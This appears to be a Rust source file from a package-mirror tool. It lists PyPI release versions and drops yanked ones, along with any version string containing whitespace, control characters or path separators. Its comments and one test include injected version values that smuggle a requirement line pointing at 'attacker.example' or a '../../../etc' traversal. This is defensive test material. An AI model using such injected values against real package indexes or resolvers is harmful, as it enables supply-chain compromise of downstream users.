// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 The OCX Authors

//! `source.type: pypi` adapter: discovers upstream versions via the PyPI
//! JSON API (`GET {index}/pypi/{package}/json`).
//!
//! Unlike `pylock` (a single committed lock resolving exactly one version),
//! a `pypi` source lists every release the index still serves. Per-version
//! PEP 751 lock derivation is a separate pipeline stage
//! (plan_python_mirror_v2 W1.A2/W2.A3) — this module is discovery only, so
//! `VersionInfo::assets` stays empty exactly like `source::pylock` (env
//! sources resolve wheels later, from a derived lock, not asset regex
//! matching — see [`crate::spec::Source::is_env`]).

use std::collections::HashMap;

use ocx_lib::log;
use serde::Deserialize;

use super::VersionInfo;
use crate::error::MirrorError;

/// Default PyPI JSON API base URL, used when `source.index` is unset.
const DEFAULT_INDEX: &str = "https://pypi.org";

/// One distributable file for a release, as returned by the PyPI JSON API.
/// Only `yanked` is consumed — discovery only cares whether a release still
/// has an installable file, not which one (wheel selection is a later
/// pipeline stage).
#[derive(Debug, Deserialize)]
struct ReleaseFile {
    #[serde(default)]
    yanked: bool,
}

/// Root of `GET {index}/pypi/{package}/json`. `info`/`urls`/`vulnerabilities`
/// are ignored — the mirror discovers every historical release via
/// `releases`, not just the current one.
#[derive(Debug, Deserialize)]
struct PypiProject {
    releases: HashMap<String, Vec<ReleaseFile>>,
}

/// Lists upstream versions for a PyPI package: every release with at least
/// one non-yanked file. Yanked releases (PEP 592) and versions with zero
/// files (no installable artifact) are dropped.
///
/// # Errors
///
/// Returns an error when the request fails, the index returns a non-success
/// HTTP status, or the body is not valid JSON. Use [`classify_error`] to map
/// the result into the right [`MirrorError`] variant — a 404 (unknown
/// package name on this index) is malformed input, not a transient resource.
pub async fn list_versions(package: &str, index: Option<&str>) -> anyhow::Result<Vec<VersionInfo>> {
    let index = index.unwrap_or(DEFAULT_INDEX).trim_end_matches('/');
    let url = format!("{index}/pypi/{package}/json");

    let response = reqwest::get(&url).await?.error_for_status()?;
    let project: PypiProject = response.json().await?;

    let mut versions = Vec::with_capacity(project.releases.len());
    for (version, files) in project.releases {
        if files.is_empty() || files.iter().all(|file| file.yanked) {
            continue;
        }
        // Trust boundary: `releases` keys are attacker-controlled when
        // `source.index` points at a hostile/compromised Warehouse index. The
        // version string is later piped verbatim into `uv pip compile -` stdin
        // as `{package}=={version}` — a newline smuggles a second requirement
        // line ("evil @ https://attacker/…") that resolves, hash-self-verifies
        // against the attacker's own bytes, and publishes under the legit tag;
        // the same string also joins a filesystem path for the derived lock.
        // Reject any version carrying whitespace, a control char, or a path
        // separator BEFORE it reaches either sink. This is orthogonal to PEP
        // 440 parseability: a weird-but-safe scheme still mirrors — only
        // dangerous characters are rejected, never "doesn't parse".
        if let Some(bad) = version
            .chars()
            .find(|ch| ch.is_whitespace() || ch.is_control() || *ch == '/' || *ch == '\\')
        {
            log::warn!(
                "dropping PyPI release with unsafe version string {version:?} (contains {bad:?}); \
                 a hostile index cannot smuggle a requirement line or path traversal through it"
            );
            continue;
        }
        // Real upstream versions are PEP 440, not the mirror's own semver-ish
        // `ocx_lib::package::version::Version` — `uv_pep440` is the correct
        // parser for prerelease/dev-release detection here (unlike
        // `source::pylock`, which reuses the OCX version type for its
        // already-locked, single version).
        let is_prerelease = version.parse::<uv_pep440::Version>().is_ok_and(|v| v.any_prerelease());
        versions.push(VersionInfo {
            version,
            assets: HashMap::new(),
            is_prerelease,
        });
    }
    Ok(versions)
}

/// Classifies an error surfaced by [`list_versions`] into the right
/// [`MirrorError`] variant.
///
/// A 404 response means the package name does not exist on this index —
/// malformed input, same exit class as `SpecInvalid`/`PylockError` (65). Any
/// other failure (connection refused, timeout, 5xx, malformed JSON body) is a
/// genuinely unavailable source, `MirrorError::SourceError` (69).
pub fn classify_error(context: &str, err: anyhow::Error) -> MirrorError {
    let is_not_found = err
        .chain()
        .filter_map(|cause| cause.downcast_ref::<reqwest::Error>())
        .any(|e| e.status() == Some(reqwest::StatusCode::NOT_FOUND));
    // `{err:#}` (alternate format) walks the full source chain instead of
    // just the outermost context string (same rationale as
    // `source::pylock::classify_error`).
    if is_not_found {
        MirrorError::PypiError(format!("{context}: {err:#}"))
    } else {
        MirrorError::SourceError(format!("{context}: {err:#}"))
    }
}

#[cfg(test)]
mod tests {
    use tokio::io::{AsyncReadExt, AsyncWriteExt};
    use tokio::net::TcpListener;

    use super::*;

    /// Install the rustls crypto provider exactly once per process. Reqwest
    /// builds its TLS stack lazily on first use and panics with "no provider
    /// set" if none is registered, even for `http://` URLs. Same helper as
    /// `pipeline/download.rs`'s test module (not centralized upstream).
    fn install_crypto_provider() {
        static ONCE: std::sync::Once = std::sync::Once::new();
        ONCE.call_once(|| {
            let _ = rustls::crypto::aws_lc_rs::default_provider().install_default();
        });
    }

    /// Spawns a local loopback server that writes `response` verbatim to the
    /// first connection it accepts, then returns its `http://127.0.0.1:<port>`
    /// base URL. Test-only stand-in for the PyPI index — no external network
    /// access.
    async fn spawn_index(response: &'static str) -> (String, tokio::task::JoinHandle<()>) {
        let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();

        let server = tokio::spawn(async move {
            let (mut socket, _) = listener.accept().await.unwrap();
            let mut scratch = [0u8; 1024];
            let _ = socket.read(&mut scratch).await;
            socket.write_all(response.as_bytes()).await.unwrap();
            socket.shutdown().await.unwrap();
        });

        (format!("http://{addr}"), server)
    }

    const PROJECT_JSON: &str = r#"{
        "info": {"name": "pycowsay"},
        "releases": {
            "1.0.0": [
                {"filename": "pycowsay-1.0.0-py3-none-any.whl", "yanked": false}
            ],
            "1.1.0": [
                {"filename": "pycowsay-1.1.0-py3-none-any.whl", "yanked": true}
            ],
            "2.0.0.dev0": [
                {"filename": "pycowsay-2.0.0.dev0-py3-none-any.whl", "yanked": false}
            ],
            "0.9.0": []
        },
        "urls": [],
        "vulnerabilities": []
    }"#;

    fn ok_response(body: &str) -> String {
        format!(
            "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
            body.len()
        )
    }

    #[tokio::test]
    async fn list_versions_drops_yanked_and_fileless_releases() {
        install_crypto_provider();
        let body = Box::leak(ok_response(PROJECT_JSON).into_boxed_str());
        let (index, server) = spawn_index(body).await;

        let versions = list_versions("pycowsay", Some(&index)).await.unwrap();
        server.await.unwrap();

        let names: Vec<&str> = versions.iter().map(|v| v.version.as_str()).collect();
        assert_eq!(names.len(), 2, "expected 1.0.0 and 2.0.0.dev0 only, got: {names:?}");
        assert!(names.contains(&"1.0.0"));
        assert!(names.contains(&"2.0.0.dev0"));
        assert!(!names.contains(&"1.1.0"), "yanked release must be dropped");
        assert!(!names.contains(&"0.9.0"), "fileless release must be dropped");
        assert!(versions.iter().all(|v| v.assets.is_empty()));
    }

    #[tokio::test]
    async fn list_versions_rejects_versions_with_injection_or_traversal_characters() {
        // BLOCK-tier supply-chain guard: `releases` keys are attacker-
        // controlled when `source.index` points at a hostile/compromised
        // Warehouse index. The version string is later piped VERBATIM into
        // `uv pip compile -` stdin as `{package}=={version}` — a newline
        // smuggles a second requirement line ("evil @ https://attacker/...")
        // that resolves, hash-self-verifies, and publishes under the legit
        // tag. The same string also feeds the derived-lock path join. Reject
        // whitespace, control chars, and path separators at this trust
        // boundary; everything downstream consumes this function's output.
        install_crypto_provider();
        let evil_json = r#"{
            "releases": {
                "1.0.0": [
                    {"filename": "pkg-1.0.0-py3-none-any.whl", "yanked": false}
                ],
                "1.0.1\nevil @ https://attacker.example/evil.whl": [
                    {"filename": "pkg-1.0.1-py3-none-any.whl", "yanked": false}
                ],
                "1.0.2/../../../etc": [
                    {"filename": "pkg-1.0.2-py3-none-any.whl", "yanked": false}
                ],
                "1.0.3\u0007": [
                    {"filename": "pkg-1.0.3-py3-none-any.whl", "yanked": false}
                ],
                "2024.01.01.post1+local": [
                    {"filename": "pkg-2024-py3-none-any.whl", "yanked": false}
                ]
            }
        }"#;
        let body = Box::leak(ok_response(evil_json).into_boxed_str());
        let (index, server) = spawn_index(body).await;

        let versions = list_versions("pkg", Some(&index)).await.unwrap();
        server.await.unwrap();

        let names: Vec<&str> = versions.iter().map(|v| v.version.as_str()).collect();
        assert!(names.contains(&"1.0.0"), "safe version must survive: {names:?}");
        // Fail-open axis preserved: weird-but-safe version schemes (even ones
        // ocx_lib::Version cannot parse) still mirror — only DANGEROUS
        // characters are rejected, not "doesn't parse".
        assert!(
            names.contains(&"2024.01.01.post1+local"),
            "unparseable-but-safe version must survive: {names:?}"
        );
        assert_eq!(names.len(), 2, "all dangerous versions must be dropped: {names:?}");
        assert!(
            !names
                .iter()
                .any(|n| n.contains('\n') || n.contains('/') || n.contains('\u{7}')),
            "no dangerous character may reach downstream consumers: {names:?}"
        );
    }

    #[tokio::test]
    async fn list_versions_flags_pep440_prerelease() {
        install_crypto_provider();
        let body = Box::leak(ok_response(PROJECT_JSON).into_boxed_str());
        let (index, server) = spawn_index(body).await;

        let versions = list_versions("pycowsay", Some(&index)).await.unwrap();
        server.await.unwrap();

        let stable = versions.iter().find(|v| v.version == "1.0.0").unwrap();
        assert!(!stable.is_prerelease);
        let dev = versions.iter().find(|v| v.version == "2.0.0.dev0").unwrap();
        assert!(dev.is_prerelease, "dev release must flag as prerelease");
    }

    #[tokio::test]
    async fn list_versions_default_index_used_when_none_given() {
        // No network call is made: an invalid package name still exercises
        // the URL-building branch via a local index instead of pypi.org.
        install_crypto_provider();
        let body = Box::leak(ok_response(r#"{"releases": {}}"#).into_boxed_str());
        let (index, server) = spawn_index(body).await;

        let versions = list_versions("pycowsay", Some(&index)).await.unwrap();
        server.await.unwrap();
        assert!(versions.is_empty());
    }

    #[tokio::test]
    async fn list_versions_surfaces_404() {
        install_crypto_provider();
        let response = "HTTP/1.1 404 Not Found\r\nContent-Length: 0\r\nConnection: close\r\n\r\n";
        let (index, server) = spawn_index(response).await;

        let err = list_versions("nonexistent-package", Some(&index)).await.unwrap_err();
        server.await.unwrap();

        let mirror_err = classify_error("failed to list PyPI releases", err);
        assert!(matches!(mirror_err, MirrorError::PypiError(_)), "got: {mirror_err:?}");
    }

    #[tokio::test]
    async fn classify_error_maps_connection_refused_to_source_error() {
        install_crypto_provider();

        let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
        let port = listener.local_addr().unwrap().port();
        drop(listener); // reserved, unused: connection refused, not a timeout

        let err = list_versions("pycowsay", Some(&format!("http://127.0.0.1:{port}")))
            .await
            .unwrap_err();
        let mirror_err = classify_error("failed to list PyPI releases", err);
        assert!(matches!(mirror_err, MirrorError::SourceError(_)), "got: {mirror_err:?}");
    }

    #[tokio::test]
    async fn list_versions_surfaces_invalid_json() {
        install_crypto_provider();
        let (index, server) =
            spawn_index("HTTP/1.1 200 OK\r\nContent-Length: 9\r\nConnection: close\r\n\r\nnot json!").await;

        let err = list_versions("pycowsay", Some(&index)).await.unwrap_err();
        server.await.unwrap();

        let mirror_err = classify_error("failed to list PyPI releases", err);
        assert!(matches!(mirror_err, MirrorError::SourceError(_)), "got: {mirror_err:?}");
    }
}
